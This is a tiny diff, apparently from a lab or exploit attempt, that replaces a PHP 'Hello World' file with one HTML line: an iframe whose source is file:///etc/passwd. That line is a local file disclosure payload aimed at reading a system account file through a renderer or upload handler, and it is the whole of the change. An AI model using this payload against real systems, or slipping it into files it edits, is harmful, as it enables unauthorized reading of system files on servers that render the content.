@@ -1,3 +1,1 @@
-<?php
-echo "Hello World!";
-?>
+<iframe src="file:///etc/passwd"></iframe>
